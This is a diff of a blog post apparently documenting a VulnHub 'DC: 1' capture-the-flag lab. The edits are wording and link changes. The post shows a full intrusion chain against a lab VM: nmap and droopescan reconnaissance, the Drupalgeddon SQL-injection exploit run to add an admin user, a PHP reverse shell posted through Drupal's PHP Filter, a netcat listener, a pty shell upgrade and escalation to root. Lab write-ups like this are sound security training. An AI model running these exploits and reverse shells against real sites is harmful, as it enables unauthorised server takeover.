@@ -2,14 +2,16 @@
 title: "VulnHub | DC: 1 - Writeup"
 excerpt: Writeup for DC:1 of DC series from VulnHub
 date: 2019-07-09 00:00:00
-categories: [cybersec, infosec, vulnhub]
-tags: [dc, drupal, php, privilege escalation, reverse shell]
+categories: [VulnHub]
 ---
 
 ## Information
-DC: 1 is the first box on the VulnHub series *DC* by [DCAU][DCAU]. There are 5 flags available but flags 1 through 4 
-exist to give you hints on what to do next to capture the next flag. As a result, this writeup will only talk about how 
-to capture the root flag only.
+DC: 1 is the first installment on the VulnHub series *DC* by [DCAU][DCAU]{:target="_blank"}. There are 5 flags 
+available but flags the first 4 flags are hints on what to do next to capture the subsequent flag. As a result, this 
+writeup will only focus on capturing the root flag. 
+
+DC: 1 aims to make the pentester gain control over a vulnerable Drupal installation and from use that control to 
+establish a reverse shell, find vulnerabilities in the system, and escalate privileges to `root`.
 
 ## Tasks
 - Capture the root flag
@@ -17,14 +19,14 @@ to capture the root flag only.
 ## Summary
 - Use `nmap` to see the services
 - Use `droopescan` to see possible version(s) of Drupal
-- Use `searchsploit` to find an exploit on Drupal and use it to gain admin control
+- Use `searchsploit` to find an exploit on Drupal and use it to gain administrative access
 - Implement a reverse shell by posting a new post and use `nc` to catch the reverse shell
 - Spawn a proper shell with `python`
 - Use `LinEnum` to find possible vulnerabilities in the system to escalate current privileges to `root`
  
 ## Walkthrough
 ### nmap
-We begin with a pretty basic `nmap` scan to see what we're dealing with.
+We begin with a pretty basic `nmap` scan to see what services we're dealing with.
 
 ```
 $ nmap -sC -sV 192.168.2.111
@@ -50,22 +52,21 @@ PORT    STATE SERVICE VERSION
 |   100000  2,3,4        111/udp  rpcbind
 |   100024  1          42936/tcp  status
 |_  100024  1          43799/udp  status
-MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-We have `SSH` on Port 22, `HTTP` on Port 80 with Drupal installed on it and `RPC` on Port 111.
+We have 3 services running; `SSH` on Port 22, `HTTP` on Port 80 with Drupal installed on it and `RPC` on Port 111.
 
-### Drupal
+### HTTP
 Taking a look at the HTTP, we're greeted with a pretty empty Drupal website.
 
 ![Drupal - Homepage][Drupal - Homepage]
 
-Other than a login box, there is nothing helpful here; no version number, posts or such. As a result we have to gather 
+Other than a login box, there is nothing helpful here; no version number, posts or such. As a result, we have to gather 
 more information regarding the system.
 
 ### Reconning and Exploiting Drupal
-To gather information on Drupal, we'll use [droopescan][Droopescan].
+Using `droopescan` we'll gather more information on the Drupal installation.
 
 ```
 $ pip install droopescan
@@ -97,11 +98,11 @@ $ droopescan scan drupal -u 192.168.2.111
     php http://192.168.2.111/modules/php/
 ```
 
-`droopescan` found us several possible versions for Drupal but once thing is certain; it's `7.2x`. With that in mind, 
-we'll search `searchsploit` to find any known exploits we can use to gain admin access. There are over 40 known 
-exploits regarding Drupal, but the most relevant 6 are displayed above. The most useful among those 6 is 
-`Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)`; which adds an admin user via SQL injection. Since 
-our version is `7.2x` this exploit will work on our version of Drupal.
+`droopescan` found us several possible versions for Drupal but one thing is certain; it's `7.2x`. With that in mind, 
+we'll search `searchsploit` to find any known exploits that we can use to gain admin access. There are over 40 known 
+exploits regarding Drupal, but the most relevant and useful one is shown below; 
+`Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)`. Since our version is `7.2x` this exploit will work 
+on our version of Drupal.
 
 ```
 $ searchsploit Drupal
@@ -111,10 +112,6 @@ Exploit Title
 [...]
 
 Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)
 
 [...] 
 -------------------------------------------------------------------------------
@@ -133,29 +130,29 @@ $ python2 34992 -t http://192.168.2.111 -u Arszilla -p password
 [*] Url: http://192.168.2.111/?q=node&destination=node
 ```
 
+We've added `Arszilla` as an admin user with the password `password`.
+
 ### Getting a Reverse Shell
-We've added `Arszilla` as an admin user with the password `password`. Once logging in we can see the posts, modules 
-and other admin only content. By accessing `Modules` we can see currently installed modules and in that list we can 
-see `PHP Filter`; which is disabled. After enabling it we edit its permissions it and allow `Administrator` to use it. 
-Now we can go ahead and create a new post where we'll be implementing our reverse shell using [this][PHP Reverse Shell] 
-PHP Reverse Shell script by [pentestmoney][pentestmonkey]. Do note that the text format must be set to `PHP Code` for 
-this to work.
+Upon logging in we can see the posts, modules and other admin only content. By accessing `Modules` we can see currently 
+installed modules and in that list we can see `PHP Filter`; which is disabled. After enabling it we can edit its 
+permissions and allow `Administrator` to use it. Now we can go ahead and create a new post where the format is set to 
+`PHP Code` and implement our reverse shell using [pentestmoney][pentestmonkey]{:target="_blank"}'s `PHP Reverse Shell` 
+script.
 
 ![Drupal - PHP Reverse Shell][Drupal - PHP Reverse Shell]
 
 After creating our new post, we'll spawn `nc` to catch the shell once we visit the post.
 
 ```
-$ nc -v -n -l -p 7500
+$ nc -lvnp 7500
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 ```
 
 ### Logging in as Root
-Now that we have a reverse shell, our first task will be to spawn a proper shell and then find any and all 
-vulnerabilities in the system to login as `root` and access `/root`. We'll use `python` to import `pty` to spawn a 
-proper shell and then use [LinEnum][LinEnum] to scan the system.
+Now that we have a reverse shell, we'll start by spawning a proper shell using `python` and then use `LinEnum` to scan 
+the system for possible vulnerabilities to exploit.
 
 ```
 $ python -c 'import pty; pty.spawn("/bin/sh")'
@@ -199,9 +196,6 @@ root
 $ cd /root
 
 $ ls -la
-total 32
-drwx------  4 root root 4096 Feb 28 12:11 .
-drwxr-xr-x 23 root root 4096 Feb 19 22:34 ..
 drwx------  2 root root 4096 Feb 19 22:30 .aptitude
 -rw-------  1 root root   44 Feb 28 12:11 .bash_history
 -rw-r--r--  1 root root  949 Feb 19 23:03 .bashrc
@@ -222,9 +216,6 @@ Thus, we've gained captured the `root` flag in DC: 1.
 
 [DCAU]:                         https://twitter.com/DCAU7
 [Mr. Robot]:                    https://www.vulnhub.com/entry/mr-robot-1,151/
-[Drupal - Homepage]:            /images/posts/2019-07-09-vulnhub-dc_1/Drupal%20-%20Homepage.png
-[Droopescan]:                   https://github.com/droope/droopescan
-[PHP Reverse Shell]:            http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+[Drupal - Homepage]:            /images/2019-07-09-vulnhub-dc_1/Drupal%20-%20Homepage.png
 [pentestmonkey]:                http://pentestmonkey.net/
-[Drupal - PHP Reverse Shell]:   /images/posts/2019-07-09-vulnhub-dc_1/Drupal%20-%20PHP%20Reverse%20Shell.png
-[LinEnum]:                      https://github.com/rebootuser/LinEnum
+[Drupal - PHP Reverse Shell]:   /images/2019-07-09-vulnhub-dc_1/Drupal%20-%20PHP%20Reverse%20Shell.png
